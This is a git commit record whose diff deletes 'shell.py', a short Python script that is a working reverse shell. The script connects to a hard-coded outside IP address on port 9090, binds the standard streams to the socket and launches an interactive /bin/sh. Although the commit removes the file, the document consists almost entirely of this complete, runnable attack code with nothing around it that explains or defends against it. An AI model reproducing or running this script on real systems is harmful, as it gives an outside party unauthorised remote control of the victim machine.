c19d989ab8ac30f9333e692dbaaf7171aa5f8b49
med pro <25457545+bing0o@users.noreply.github.com>
2020-02-19 13:17:20 +0100

    Delete shell.py

--- shell.py
+++
@@ -1,7 +0,0 @@
-import socket, subprocess, os
-s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("143.95.42.191", 9090))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-p=subprocess.call(["/bin/sh","-i"])
